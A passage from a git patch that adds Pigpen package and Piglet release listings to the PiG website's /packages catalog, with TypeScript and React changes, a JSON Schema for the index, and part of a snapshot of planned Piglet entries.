@@ -1,0 +1,1208 @@
+From 1a767248a6a2a33dacb11451c0b15293bff082f9 Mon Sep 17 00:00:00 2001
+From: Michael Kinsy <mrkinsy5@gmail.com>
+Date: Mon, 5 Oct 2026 14:02:54 -0700
+Subject: [PATCH] site: list released Pigpen Packages and Piglets on /packages
+
+New sources Pigpen Packages and Pigpen Piglets from Pigpen's generated index.json
+(scripts/build-pigpen-catalog.mjs): validated against Pigpen's schema, only available
+entries, every install/pull command and URL re-derived from the entry's identity and refused
+when it differs, committed snapshot as the fallback. Cards show the exact command, the
+Binary platforms and the signing key of a Piglet. No downloads are hosted.
+
+Signed-off-by: Michael Kinsy <mrkinsy5@gmail.com>
+---
+ README.md                        |   2 +-
+ app/catalog-types.ts             |  10 +-
+ app/package-catalog.tsx          |  33 ++-
+ data/pigpen-index.schema.json    | 430 +++++++++++++++++++++++++++++++
+ data/pigpen-index.snapshot.json  | 289 +++++++++++++++++++++
+ docs/catalog-sync.md             |  20 ++
+ package.json                     |   6 +-
+ scripts/build-pigpen-catalog.mjs | 138 ++++++++++
+ test/pigpen-catalog.test.mjs     |  98 +++++++
+ 9 files changed, 1009 insertions(+), 17 deletions(-)
+ create mode 100644 data/pigpen-index.schema.json
+ create mode 100644 data/pigpen-index.snapshot.json
+ create mode 100644 scripts/build-pigpen-catalog.mjs
+ create mode 100644 test/pigpen-catalog.test.mjs
+
+diff --git a/README.md b/README.md
+index b1234d7..17040b5 100644
+--- a/README.md
++++ b/README.md
+@@ -88,7 +88,7 @@ The PiG user website adapts the information architecture of pi.dev. It uses Reac
+ - Upstream release data is adapted from the MIT-licensed Pi project and remains labeled as upstream content.
+ - News comes from PiG's GitHub releases, read at `pnpm generate` by `scripts/fetch-releases.mjs` into `data/pig-releases.json` (not committed), which also feeds `feed.xml`. With no releases or no access, News shows an empty state. The daily deploy picks up new releases.
+ - The model catalog in `data/models.json` is generated from the pinned Pi package's published catalog by `scripts/site-models.mjs` (`pnpm models:build`), the same source as PiG's Go catalog.
+-- The catalog lists npm packages by keyword: Pi packages (`pi-package`), PiG packages (`pig-package`) and Piglets (`pig-piglet`). `scripts/build-npm-catalog.mjs` reads npm search at `pnpm generate`, falls back to the committed `data/npm-catalog.snapshot.json` when npm fails, and writes ignored `public/catalog/*.json`. The 27 reviewed packages in `data/verified-packages.json` carry a "Verified with PiG" badge; their historical smoke checks used the unreleased `0.2.1+0.87.1`. `scripts/build-package-catalog.mjs` projects them into ignored `data/packages.public.json`. See [docs/catalog-sync.md](docs/catalog-sync.md).
++- The catalog first lists what the Pigpen repository has released (Packages from Git tags, signed Piglet Binaries from GitHub Releases; `scripts/build-pigpen-catalog.mjs`), then npm packages by keyword: Pi packages (`pi-package`), PiG packages (`pig-package`) and Piglets (`pig-piglet`). `scripts/build-npm-catalog.mjs` reads npm search at `pnpm generate`, falls back to the committed `data/npm-catalog.snapshot.json` when npm fails, and writes ignored `public/catalog/*.json`. The 27 reviewed packages in `data/verified-packages.json` carry a "Verified with PiG" badge; their historical smoke checks used the unreleased `0.2.1+0.87.1`. `scripts/build-package-catalog.mjs` projects them into ignored `data/packages.public.json`. See [docs/catalog-sync.md](docs/catalog-sync.md).
+ - The UI uses Grommet components and a project-owned theme.
+ 
+ ### Navigation and package catalogs
+diff --git a/app/catalog-types.ts b/app/catalog-types.ts
+index f440717..b5e5183 100644
+--- a/app/catalog-types.ts
++++ b/app/catalog-types.ts
+@@ -20,17 +20,21 @@ export function filterCatalog(entries: PackageEntry[], query: string, language:
+ }
+ 
+ /** The three things the catalog lists; each is one npm keyword (scripts/build-npm-catalog.mjs). */
+-export type Source = 'pi' | 'pig' | 'piglet';
++export type Source = 'pigpen-package' | 'pigpen-piglet' | 'pi' | 'pig' | 'piglet';
++/** The two sources that come from the Pigpen repository's index (scripts/build-pigpen-catalog.mjs), not from npm. */
++export const isPigpen = (source: Source) => source === 'pigpen-package' || source === 'pigpen-piglet';
+ export type NpmEntry = {
+   name: string; description: string; author: string; version: string; date: string;
+   downloads: number; types: string[]; repository?: string;
++  /** Pigpen sources only: the exact command Pigpen published, the Binary platforms and signing key of a Piglet, and the source tree. */
++  command?: string; platforms?: string[]; keyId?: string; keyUrl?: string; sourceUrl?: string;
+ };
+ export type SourceMeta = { syncedAt: string; origin: 'live' | 'snapshot'; count: number; first: NpmEntry[] };
+ export type NpmMeta = { sources: Record<Source, SourceMeta> };
+ export type SortKey = 'downloads' | 'recent' | 'name';
+ 
+ export const PAGE_SIZE = 24;
+-export const sourceLabels: Record<Source, string> = { pi: 'Pi packages', pig: 'PiG packages', piglet: 'Piglets' };
++export const sourceLabels: Record<Source, string> = { 'pigpen-package': 'Pigpen Packages', 'pigpen-piglet': 'Pigpen Piglets', pi: 'Pi packages', pig: 'PiG packages', piglet: 'Piglets' };
+ export const SORT_OPTIONS: { label: string; value: SortKey }[] = [
+   { label: 'Most downloads', value: 'downloads' }, { label: 'Recently published', value: 'recent' }, { label: 'Name A–Z', value: 'name' },
+ ];
+@@ -38,6 +42,8 @@ export const SORT_OPTIONS: { label: string; value: SortKey }[] = [
+ /** The commands `pig` accepts today: Packages install from npm; Piglet source adds from npm. */
+ export const installCommand = (source: Source, name: string) =>
+   source === 'piglet' ? `pig piglet add npm:${name}` : `pig install npm:${name}`;
++/** The command a card shows: Pigpen's own published command when the entry has one, else the npm form. */
++export const cardCommand = (source: Source, entry: NpmEntry) => entry.command ?? installCommand(source, entry.name);
+ 
+ export function queryEntries(entries: NpmEntry[], query: string, type: string, sort: SortKey) {
+   const words = query.toLowerCase().trim().split(/\s+/).filter(Boolean);
+diff --git a/app/package-catalog.tsx b/app/package-catalog.tsx
+index 6df852c..4703e14 100644
+--- a/app/package-catalog.tsx
++++ b/app/package-catalog.tsx
+@@ -6,7 +6,7 @@ import { Button, Pagination, Select, TextInput } from 'grommet';
+ import { Cube, Search } from 'grommet-icons';
+ import { PageIntro } from './content';
+ import { CopyButton } from './pig-site';
+-import { PAGE_SIZE, SORT_OPTIONS, entryURL, installCommand, queryEntries, sourceLabels } from './catalog-types';
++import { PAGE_SIZE, SORT_OPTIONS, cardCommand, entryURL, isPigpen, queryEntries, sourceLabels } from './catalog-types';
+ import { siteAsset } from './site-path';
+ import type { Catalog, NpmEntry, NpmMeta, PackageEntry, SortKey, Source } from './catalog-types';
+ 
+@@ -20,27 +20,32 @@ function Command({ value, label }: { value: string; label: string }) {
+ }
+ 
+ function CatalogCard({ entry, source, verified }: { entry: NpmEntry; source: Source; verified?: PackageEntry }) {
+-  const command = verified?.installCommand ?? installCommand(source, entry.name);
++  const command = verified?.installCommand ?? cardCommand(source, entry);
+   const types = entry.types.length ? entry.types : ['package'];
++  const pigpen = isPigpen(source);
+   return <article className="package-card catalog-card">
+     <div className="package-card-top"><Cube color="brand" size="22px"/>
+-      <span className="small-muted">{source === 'piglet' ? 'Piglet' : types.join(' · ')}</span>
+-      {source !== 'pi' && <span className="tag" title="A community listing found by npm keyword. PiG has not reviewed it.">Unreviewed community listing</span>}
++      <span className="small-muted">{source === 'piglet' || source === 'pigpen-piglet' ? 'Piglet' : types.join(' · ')}</span>
++      {pigpen && <span className="tag" title="Released from the Pigpen repository by its maintainer. Not a security audit or a compatibility guarantee.">Pigpen release</span>}
++      {!pigpen && source !== 'pi' && <span className="tag" title="A community listing found by npm keyword. PiG has not reviewed it.">Unreviewed community listing</span>}
+       {verified && <span className="tag" title="Installed and started with a PiG build. Not a security audit or a compatibility guarantee.">Verified with PiG</span>}
+     </div>
+-    <h3>{verified ? <Link href={entryURL(verified)}>{entry.name}</Link> : <a href={'https://www.npmjs.com/package/' + entry.name} target="_blank" rel="noreferrer">{entry.name}</a>}</h3>
++    <h3>{verified ? <Link href={entryURL(verified)}>{entry.name}</Link> : pigpen ? <a href={entry.sourceUrl} target="_blank" rel="noreferrer">{entry.name}</a> : <a href={'https://www.npmjs.com/package/' + entry.name} target="_blank" rel="noreferrer">{entry.name}</a>}</h3>
+     <p>{entry.description}</p>
+-    <div className="package-meta"><span>{entry.author || 'Unknown publisher'}</span><span>{compact.format(entry.downloads)}/mo</span><span>{day(entry.date)}</span><span>v{verified?.version ?? entry.version}</span></div>
+-    <div className="package-command"><code>{command}</code><CopyButton value={command} label={'Copy install command for ' + entry.name}/></div>
++    <div className="package-meta"><span>{entry.author || 'Unknown publisher'}</span>{!pigpen && <span>{compact.format(entry.downloads)}/mo</span>}<span>{day(entry.date)}</span><span>v{verified?.version ?? entry.version}</span></div>
++    <div className="package-command"><code>{command}</code><CopyButton value={command} label={(source === 'pigpen-piglet' ? 'Copy pull command for ' : 'Copy install command for ') + entry.name}/></div>
++    {source === 'pigpen-piglet' && entry.platforms && <p className="small-muted">Signed Binaries: {entry.platforms.join(', ')}. Signer <code>{entry.keyId}</code> (<a href={entry.keyUrl} target="_blank" rel="noreferrer">public key ↗</a>). pig pins the signer on the first pull; check it with <code>pig piglet trust add</code>.</p>}
+     <div className="package-links">
+       {verified && <Link href={entryURL(verified)}>Details →</Link>}
+-      <a href={'https://www.npmjs.com/package/' + entry.name} target="_blank" rel="noreferrer">npm ↗</a>
++      {pigpen ? <a href={entry.sourceUrl} target="_blank" rel="noreferrer">source ↗</a> : <a href={'https://www.npmjs.com/package/' + entry.name} target="_blank" rel="noreferrer">npm ↗</a>}
+       {entry.repository && <a href={entry.repository} target="_blank" rel="noreferrer">repo ↗</a>}
+     </div>
+   </article>;
+ }
+ 
+ const sourceNotes: Record<Source, string> = {
++  'pigpen-package': 'Packages released from the Pigpen repository. Each installs from its own Git tag, so the version you install is the version listed. Go extensions build from source on first use and need a Go toolchain.',
++  'pigpen-piglet': 'Piglets released from the Pigpen repository as signed per-platform Binaries on GitHub Releases. pi-in-go.dev hosts no downloads: the command pulls the release from GitHub and pig verifies its signature and checksums.',
+   pi: 'Packages published to npm with the pi-package keyword, the same rule pi.dev uses. Listing here does not imply PiG compatibility.',
+   pig: 'Packages published to npm with the pig-package keyword. Community listings are unreviewed.',
+   piglet: 'Piglets published to npm with the pig-piglet keyword. Community listings are unreviewed.',
+@@ -53,6 +58,11 @@ function SyncStatus({ meta }: { meta: NpmMeta['sources'][Source] }) {
+ }
+ 
+ function EmptySource({ source }: { source: Source }) {
++  if (isPigpen(source)) return <div className="empty-state">
++    <h3>No Pigpen {source === 'pigpen-package' ? 'Packages' : 'Piglets'} released yet</h3>
++    <p>Nothing from the Pigpen repository has a release recorded yet. The list fills in at the next daily build after one does.</p>
++    <a className="text-link" href="https://github.com/MichaelKinsy/pigpen" target="_blank" rel="noreferrer">Pigpen on GitHub ↗</a>
++  </div>;
+   return <div className="empty-state">
+     <h3>No {sourceLabels[source]} listed yet</h3>
+     <p>{source === 'pig'
+@@ -63,7 +73,8 @@ function EmptySource({ source }: { source: Source }) {
+ }
+ 
+ export function PackageCatalogPage({ catalog, meta }: { catalog: Catalog; meta: NpmMeta }) {
+-  const [source, setSource] = useState<Source>('pi');
++  // Pigpen's own releases first once there are any; the npm sources are far larger and stay one click away.
++  const [source, setSource] = useState<Source>(() => (meta.sources['pigpen-package'].count ? 'pigpen-package' : meta.sources['pigpen-piglet'].count ? 'pigpen-piglet' : 'pi'));
+   const [query, setQuery] = useState('');
+   const [type, setType] = useState('All types');
+   const [sort, setSort] = useState<SortKey>('downloads');
+@@ -90,7 +101,7 @@ export function PackageCatalogPage({ catalog, meta }: { catalog: Catalog; meta:
+   const reset = () => { setQuery(''); setType('All types'); setSort('downloads'); setPage(1); };
+   const changeSource = (next: Source) => { setSource(next); reset(); };
+   return <>
+-    <PageIntro eyebrow="EXTEND PIG" title="Packages" description="Pi packages, PiG packages, and Piglets published on npm. Review publisher guidance before installing."/>
++    <PageIntro eyebrow="EXTEND PIG" title="Packages" description="Packages and Piglets released from Pigpen, plus Pi packages, PiG packages, and Piglets published on npm. Review publisher guidance before installing."/>
+     <div className="catalog-container package-catalog">
+       <div className="package-source-bar"><div role="group" aria-label="Catalog source" style={{ display: 'flex', flexWrap: 'wrap', gap: 12 }}>
+         {SOURCES.map(value => <Button key={value} label={`${sourceLabels[value]} (${meta.sources[value].count.toLocaleString('en-US')})`} primary={source === value} secondary={source !== value} aria-pressed={source === value} onClick={() => changeSource(value)}/>)}
+@@ -98,7 +109,7 @@ export function PackageCatalogPage({ catalog, meta }: { catalog: Catalog; meta:
+       <div className="catalog-sync" role="status"><SyncStatus meta={info}/><Link href="/docs/latest/packages">Package documentation →</Link></div>
+       <form className="filter-bar package-filter-bar" onSubmit={e => e.preventDefault()} role="search" aria-label="Catalog search">
+         <div className="search-field"><Search size="19px"/><TextInput aria-label="Filter catalog" placeholder="Filter by name, description, or author…" value={query} disabled={!full} onChange={e => { setQuery(e.target.value); setPage(1); }}/></div>
+-        {source !== 'piglet' && <Select aria-label="Package type" options={TYPES} value={type} disabled={!full} onChange={({ option }) => { setType(option); setPage(1); }}/>}
++        {source !== 'piglet' && source !== 'pigpen-piglet' && <Select aria-label="Package type" options={TYPES} value={type} disabled={!full} onChange={({ option }) => { setType(option); setPage(1); }}/>}
+         <Select aria-label="Sort" options={SORT_OPTIONS} labelKey="label" valueKey={{ key: 'value', reduce: true }} value={sort} disabled={!full} onChange={({ value }) => { setSort(value as SortKey); setPage(1); }}/>
+         <Button label="Reset" onClick={reset}/>
+       </form>
+diff --git a/data/pigpen-index.schema.json b/data/pigpen-index.schema.json
+new file mode 100644
+index 0000000..6015b85
+--- /dev/null
++++ b/data/pigpen-index.schema.json
+@@ -0,0 +1,430 @@
++{
++  "type": "object",
++  "additionalProperties": false,
++  "properties": {
++    "$schema": {
++      "$ref": "#/definitions/url"
++    },
++    "schemaVersion": {
++      "const": 1
++    },
++    "updatedAt": {
++      "type": "string",
++      "format": "date"
++    },
++    "entries": {
++      "type": "array",
++      "items": {
++        "$ref": "#/definitions/entry"
++      },
++      "uniqueItems": true,
++      "minItems": 1
++    }
++  },
++  "required": [
++    "schemaVersion",
++    "updatedAt",
++    "entries"
++  ],
++  "$schema": "http://json-schema.org/draft-07/schema#",
++  "$id": "https://pi-in-go.dev/catalog.schema.json",
++  "title": "PiG catalog",
++  "definitions": {
++    "url": {
++      "type": "string",
++      "format": "uri",
++      "pattern": "^https://[^\\s]+$",
++      "maxLength": 1000
++    },
++    "version": {
++      "type": "string",
++      "pattern": "^[0-9]+\\.[0-9]+\\.[0-9]+(?:-[0-9A-Za-z.-]+)?(?:\\+[0-9A-Za-z.-]+)?$"
++    },
++    "source": {
++      "type": "object",
++      "additionalProperties": false,
++      "properties": {
++        "type": {
++          "enum": [
++            "npm",
++            "git"
++          ]
++        },
++        "spec": {
++          "type": "string",
++          "minLength": 1,
++          "maxLength": 500
++        },
++        "url": {
++          "$ref": "#/definitions/url"
++        }
++      },
++      "required": [
++        "type",
++        "spec",
++        "url"
++      ]
++    },
++    "verification": {
++      "type": "object",
++      "additionalProperties": false,
++      "properties": {
++        "status": {
++          "const": "passed"
++        },
++        "pigVersion": {
++          "$ref": "#/definitions/version"
++        },
++        "pigCommit": {
++          "type": "string",
++          "pattern": "^[0-9a-f]{40}$"
++        },
++        "piVersion": {
++          "$ref": "#/definitions/version"
++        },
++        "date": {
++          "type": "string",
++          "format": "date"
++        },
++        "scope": {
++          "type": "string",
++          "minLength": 1,
++          "maxLength": 1500
++        },
++        "notes": {
++          "type": "array",
++          "items": {
++            "type": "string",
++            "minLength": 1,
++            "maxLength": 1500
++          },
++          "uniqueItems": true,
++          "minItems": 0
++        },
++        "evidence": {
++          "$ref": "#/definitions/url"
++        }
++      },
++      "required": [
++        "status",
++        "pigVersion",
++        "pigCommit",
++        "piVersion",
++        "date",
++        "scope",
++        "notes",
++        "evidence"
++      ]
++    },
++    "release": {
++      "type": "object",
++      "additionalProperties": false,
++      "properties": {
++        "version": {
++          "$ref": "#/definitions/version"
++        },
++        "signed": {
++          "const": true
++        },
++        "indexUrl": {
++          "$ref": "#/definitions/url"
++        },
++        "pullCommand": {
++          "type": "string",
++          "minLength": 1,
++          "maxLength": 500
++        },
++        "platforms": {
++          "type": "array",
++          "items": {
++            "enum": [
++              "linux/amd64",
++              "linux/arm64",
++              "darwin/amd64",
++              "darwin/arm64",
++              "windows/amd64",
++              "windows/arm64"
++            ]
++          },
++          "uniqueItems": true,
++          "minItems": 1
++        },
++        "verificationKey": {
++          "type": "object",
++          "additionalProperties": false,
++          "properties": {
++            "id": {
++              "type": "string",
++              "pattern": "^ed25519:[0-9a-f]{32}$"
++            },
++            "publicKeyUrl": {
++              "$ref": "#/definitions/url"
++            }
++          },
++          "required": [
++            "id",
++            "publicKeyUrl"
++          ]
++        }
++      },
++      "required": [
++        "version",
++        "signed",
++        "indexUrl",
++        "pullCommand",
++        "platforms",
++        "verificationKey"
++      ]
++    },
++    "entry": {
++      "type": "object",
++      "additionalProperties": false,
++      "properties": {
++        "id": {
++          "type": "string",
++          "pattern": "^(?:@[a-z0-9][a-z0-9._-]*/)?[a-z0-9][a-z0-9._-]*$",
++          "maxLength": 160
++        },
++        "kind": {
++          "enum": [
++            "package",
++            "piglet"
++          ]
++        },
++        "name": {
++          "type": "string",
++          "minLength": 1,
++          "maxLength": 160
++        },
++        "description": {
++          "type": "string",
++          "minLength": 1,
++          "maxLength": 1000
++        },
++        "maintainer": {
++          "type": "string",
++          "minLength": 1,
++          "maxLength": 160
++        },
++        "official": {
++          "type": "boolean"
++        },
++        "featured": {
++          "type": "boolean"
++        },
++        "status": {
++          "enum": [
++            "available",
++            "planned"
++          ]
++        },
++        "languages": {
++          "type": "array",
++          "items": {
++            "type": "string",
++            "minLength": 1,
++            "maxLength": 40
++          },
++          "uniqueItems": true,
++          "minItems": 0
++        },
++        "repository": {
++          "$ref": "#/definitions/url"
++        },
++        "source": {
++          "$ref": "#/definitions/source"
++        },
++        "version": {
++          "$ref": "#/definitions/version"
++        },
++        "license": {
++          "type": "string",
++          "minLength": 1,
++          "maxLength": 100
++        },
++        "resources": {
++          "type": "array",
++          "items": {
++            "enum": [
++              "extension",
++              "skill",
++              "prompt",
++              "theme",
++              "hook",
++              "mcp",
++              "agent-environment"
++            ]
++          },
++          "uniqueItems": true,
++          "minItems": 0
++        },
++        "installCommand": {
++          "type": "string",
++          "minLength": 1,
++          "maxLength": 500
++        },
++        "piCompatibility": {
++          "enum": [
++            "tested",
++            "not-tested",
++            "not-applicable"
++          ]
++        },
++        "verification": {
++          "$ref": "#/definitions/verification"
++        },
++        "addCommand": {
++          "type": "string",
++          "minLength": 1,
++          "maxLength": 500
++        },
++        "releases": {
++          "type": "array",
++          "items": {
++            "$ref": "#/definitions/release"
++          },
++          "uniqueItems": true,
++          "minItems": 0
++        },
++        "notes": {
++          "type": "array",
++          "items": {
++            "type": "string",
++            "minLength": 1,
++            "maxLength": 1500
++          },
++          "uniqueItems": true,
++          "minItems": 0
++        },
++        "manifestSha256": {
++          "type": "string",
++          "pattern": "^[0-9a-f]{64}$"
++        }
++      },
++      "required": [
++        "id",
++        "kind",
++        "name",
++        "description",
++        "maintainer",
++        "official",
++        "featured",
++        "status",
++        "languages",
++        "source",
++        "notes"
++      ],
++      "allOf": [
++        {
++          "if": {
++            "properties": {
++              "kind": {
++                "const": "package"
++              }
++            }
++          },
++          "then": {
++            "required": [
++              "version",
++              "license",
++              "resources",
++              "installCommand",
++              "piCompatibility"
++            ],
++            "properties": {
++              "status": {
++                "const": "available"
++              },
++              "addCommand": false,
++              "releases": false
++            }
++          },
++          "else": {
++            "required": [
++              "releases",
++              "repository"
++            ],
++            "properties": {
++              "installCommand": false,
++              "resources": false,
++              "piCompatibility": false,
++              "verification": false
++            }
++          }
++        },
++        {
++          "if": {
++            "required": [
++              "piCompatibility"
++            ],
++            "properties": {
++              "piCompatibility": {
++                "const": "tested"
++              }
++            }
++          },
++          "then": {
++            "required": [
++              "verification"
++            ]
++          }
++        },
++        {
++          "if": {
++            "required": [
++              "verification"
++            ]
++          },
++          "then": {
++            "properties": {
++              "piCompatibility": {
++                "const": "tested"
++              }
++            }
++          }
++        },
++        {
++          "if": {
++            "properties": {
++              "status": {
++                "const": "planned"
++              }
++            }
++          },
++          "then": {
++            "properties": {
++              "releases": {
++                "type": "array",
++                "maxItems": 0
++              }
++            }
++          }
++        },
++        {
++          "if": {
++            "properties": {
++              "kind": {
++                "const": "piglet"
++              },
++              "status": {
++                "const": "available"
++              }
++            },
++            "required": [
++              "kind",
++              "status"
++            ]
++          },
++          "then": {
++            "properties": {
++              "releases": {
++                "type": "array",
++                "minItems": 1
++              }
++            }
++          }
++        }
++      ]
++    }
++  }
++}
+diff --git a/data/pigpen-index.snapshot.json b/data/pigpen-index.snapshot.json
+new file mode 100644
+index 0000000..97c4043
+--- /dev/null
++++ b/data/pigpen-index.snapshot.json
+@@ -0,0 +1,289 @@
++{
++  "schemaVersion": 1,
++  "syncedAt": "2026-10-05T00:00:00.000Z",
++  "index": {
++    "schemaVersion": 1,
++    "updatedAt": "2026-09-30",
++    "entries": [
++      {
++        "id": "a2a",
++        "kind": "piglet",
++        "name": "a2a",
++        "description": "PiG that speaks A2A (Agent2Agent): call remote A2A agents from tools, and serve PiG tasks to A2A agents when you configure a listener. Off until configured.",
++        "maintainer": "MichaelKinsy",
++        "official": false,
++        "featured": false,
++        "status": "planned",
++        "languages": [
++          "go"
++        ],
++        "repository": "https://github.com/MichaelKinsy/pigpen",
++        "source": {
++          "type": "git",
++          "spec": "git:https://github.com/MichaelKinsy/pigpen.git",
++          "url": "https://github.com/MichaelKinsy/pigpen/tree/main/piglets/a2a"
++        },
++        "manifestSha256": "f84e53bfc087fd630d6750ba5848367f936c4462d92e3f4d1aab3e4afad66d8c",
++        "releases": [],
++        "notes": [
++          "Not released yet: no signed Piglet Binary is published and no remote install command is offered. The source composition is in this repository; see RELEASE-BLOCKERS.md.",
++          "The A2A listener is off unless a2a.json, PIG_A2A_LISTEN or --a2a-listen configures it, and it refuses to start without authentication tokens.",
++          "The extension is Go and fuses into the Piglet Binary; it depends on the upstream a2a-go v2.6.0 (Apache-2.0).",
++          "Also selected by pig-with-batteries; the listener is off there too until configured.",
++          "The manifest lists five build targets, but only linux/amd64 has been built and run; linux/arm64, darwin/arm64, darwin/amd64 and windows/amd64 are listed in the manifest and compile-checked only, so no platform is a support claim."
++        ]
++      },
++      {
++        "id": "acp",
++        "kind": "piglet",
++        "name": "acp",
++        "description": "PiG for editors: an agent that an Agent Client Protocol client such as Zed drives through the pig-acp companion, with /acp to show how to configure it.",
++        "maintainer": "MichaelKinsy",
++        "official": false,
++        "featured": false,
++        "status": "planned",
++        "languages": [
++          "go"
++        ],
++        "repository": "https://github.com/MichaelKinsy/pigpen",
++        "source": {
++          "type": "git",
++          "spec": "git:https://github.com/MichaelKinsy/pigpen.git",
++          "url": "https://github.com/MichaelKinsy/pigpen/tree/main/piglets/acp"
++        },
++        "manifestSha256": "5c75f51be1baa88a750f805eeb1b4305560040c45018a618777231f37668632c",
++        "releases": [],
++        "notes": [
++          "Not released yet: no signed Piglet Binary is published and no remote install command is offered. The source composition is in this repository; see RELEASE-BLOCKERS.md.",
++          "Go only. Lets an editor that speaks the Agent Client Protocol (Zed and others) drive a PiG agent: the Package components/acp is a Go port of pi-acp (Sergii Kozak, MIT).",
++          "The Piglet Binary does not speak ACP by itself. ACP is JSON-RPC on stdio and a fused extension must not write protocol bytes to the host's stdout, so the entrypoint is the companion executable pig-acp, started by the editor with --pig pointing at this agent. Proven with a built Piglet Binary as the --pig target of pig-acp (11 end-to-end scenarios and the ACP reference client); there is no one-command Binary yet.",
++          "Advertised and implemented: initialize, session/new, session/load, session/list, session/delete, session/prompt with streaming text, thoughts, tool calls, diffs and terminal output, session/cancel, model and thinking-level selection, context usage, permission requests for extension select and confirm dialogs. Not supported, by design: file system and terminal delegation, MCP servers passed by the editor, extension slash commands, input and editor dialogs.",
++          "No release is published; version 0.1.0 is a development default and only linux/amd64 has been built and run; linux/arm64, darwin/arm64, darwin/amd64 and windows/amd64 are listed in the manifest and compile-checked only; neither is a support claim."
++        ]
++      },
++      {
++        "id": "herdr",
++        "kind": "piglet",
++        "name": "herdr",
++        "description": "PiG with the herdr agent-state reporter: idle, working and blocked in herdr's sidebar, notifications and `herdr agent wait`.",
++        "maintainer": "MichaelKinsy",
++        "official": false,
++        "featured": false,
++        "status": "planned",
++        "languages": [
++          "go"
++        ],
++        "repository": "https://github.com/MichaelKinsy/pigpen",
++        "source": {
++          "type": "git",
++          "spec": "git:https://github.com/MichaelKinsy/pigpen.git",
++          "url": "https://github.com/MichaelKinsy/pigpen/tree/main/piglets/herdr"
++        },
++        "manifestSha256": "5687870ce4601995d38c7fe8b90c66e20c3a978200db6257d3efd9ac2954bbde",
++        "releases": [],
++        "notes": [
++          "Not released yet: no signed Piglet Binary is published and no remote install command is offered. The source composition is in this repository; see RELEASE-BLOCKERS.md.",
++          "Optional: the reporter is the standalone extension Package components/herdr, which works on its own in plain PiG without this Piglet.",
++          "The extension does nothing unless PiG runs inside a herdr pane (HERDR_ENV=1 with HERDR_PANE_ID, HERDR_BIN_PATH and HERDR_SOCKET_PATH set), as herdr's published integration guide (https://herdr.dev/docs/add-herdr-support/) requires.",
++          "With herdr 0.9.2 or later it also reports the resume command `pig --session <session file>`, so herdr restores the pig session in its pane after a server restart. The restore runs plain `pig` (no Piglet or launch flags), and an in-memory session reports no command. Older herdr keeps the state reports and the release; the resume command is left out.",
++          "It is a Go extension on PiG's public SDK: building the Piglet needs a Go toolchain, not Node.js. It does not honor the Pi-only herdr:blocked event, because the Go SDK has no pi.events bridge.",
++          "A local Piglet Binary builds with the reviewed PiG and reports to a fake herdr, but none is signed or published. The manifest lists five build targets, but only linux/amd64 has been built and run; linux/arm64, darwin/arm64, darwin/amd64 and windows/amd64 are listed in the manifest and compile-checked only, so no platform is a support claim."
++        ]
++      },
++      {
++        "id": "jev",
++        "kind": "piglet",
++        "name": "jev",
++        "description": "PiG with Jev, a typed judge for tool calls and tool output (destructive? leaks data? beyond scope? secret in the output?). Off until you run /jev on, which shows what leaves the machine first; it fails open.",
++        "maintainer": "MichaelKinsy",
++        "official": false,
++        "featured": true,
++        "status": "planned",
++        "languages": [
++          "go"
++        ],
++        "repository": "https://github.com/MichaelKinsy/pigpen",
++        "source": {
++          "type": "git",
++          "spec": "git:https://github.com/MichaelKinsy/pigpen.git",
++          "url": "https://github.com/MichaelKinsy/pigpen/tree/main/piglets/jev"
++        },
++        "manifestSha256": "5e9c50fe4fb0072259f73fdf33d227afb5c2efa85a78926b6ebdd990cde9240b",
++        "releases": [],
++        "notes": [
++          "Not released yet: no signed Piglet Binary is published and no remote install command is offered. The source composition is in this repository; see RELEASE-BLOCKERS.md.",
++          "Optional: the judge is the standalone extension Package components/jev, which works on its own in plain PiG without this Piglet.",
++          "Off by default. Nothing is judged and nothing is sent until you run /jev on (which shows what leaves the machine and where) or set \"enabled\": true in your own pi-jev.json. A key in the environment or a file in a repository never turns it on.",
++          "The judge is the model PiG is configured with (default) or the TypeSafe API, through the shared Go client Package components/typesafe. Content goes to that provider; /jev names it.",
++          "Fails open: when the judge is unavailable, tool calls run unjudged. A judgment is probabilistic advice, not a sandbox.",
++          "The manifest lists five build targets, but only linux/amd64 has been built and run; linux/arm64, darwin/arm64, darwin/amd64 and windows/amd64 are listed in the manifest and compile-checked only, so no platform is a support claim."
++        ]
++      },
++      {
++        "id": "pig-extension-porter",
++        "kind": "piglet",
++        "name": "pig-extension-porter",
++        "description": "Port a Pi TypeScript extension to a Go PiG extension: SDK gap check, tests first, differential equivalence against the original, mutation check, binary build and a Package with provenance.",
++        "maintainer": "MichaelKinsy",
++        "official": false,
++        "featured": false,
++        "status": "planned",
++        "languages": [
++          "go"
++        ],
++        "repository": "https://github.com/MichaelKinsy/pigpen",
++        "source": {
++          "type": "git",
++          "spec": "git:https://github.com/MichaelKinsy/pigpen.git",
++          "url": "https://github.com/MichaelKinsy/pigpen/tree/main/piglets/pig-extension-porter"
++        },
++        "manifestSha256": "8d7c88b595c415395a0c0c948700b7ec8fac37bfb1b2c6f5e1f81dab8bb4810c",
++        "releases": [],
++        "notes": [
++          "Not released yet: no signed Piglet Binary is published and no remote install command is offered. The source composition is in this repository; see RELEASE-BLOCKERS.md.",
++          "Go only. The focused porter for Pi TypeScript extensions: the strict porting Skill plus the equivalence harness as a fused Go extension. Run npm run stage before using its generated manifest under dist/staged.",
++          "Most users who port extensions want this Piglet rather than pig-porter, which extends it. Its Packages (extension-port, extension-equivalence) also install on their own with pig install.",
++          "A Piglet Binary builds locally from the staged manifest with PIG_SOURCE_ROOT set to a git checkout of the PiG source. No release is published; version 0.1.0 is a development default and only linux/amd64 has been built and run; linux/arm64, darwin/arm64, darwin/amd64 and windows/amd64 are listed in the manifest and compile-checked only; neither is a support claim."
++        ]
++      },
++      {
++        "id": "pig-games",
++        "kind": "piglet",
++        "name": "pig-games",
++        "description": "PiG with two pixel-art games, PiG Runner (/runner) and Angry Pigs (/angry-pigs), starring the pig you chose with PiG's /sprite. Nothing starts until you type a command.",
++        "maintainer": "MichaelKinsy",
++        "official": false,
++        "featured": false,
++        "status": "planned",
++        "languages": [
++          "go"
++        ],
++        "repository": "https://github.com/MichaelKinsy/pigpen",
++        "source": {
++          "type": "git",
++          "spec": "git:https://github.com/MichaelKinsy/pigpen.git",
++          "url": "https://github.com/MichaelKinsy/pigpen/tree/main/piglets/pig-games"
++        },
++        "manifestSha256": "96fe1d34dcb16b9a4c3f710215967d01fd52151509dd3cab116f8bd15a6d0c95",
++        "releases": [],
++        "notes": [
++          "Not released yet: no signed Piglet Binary is published and no remote install command is offered. The source composition is in this repository; see RELEASE-BLOCKERS.md.",
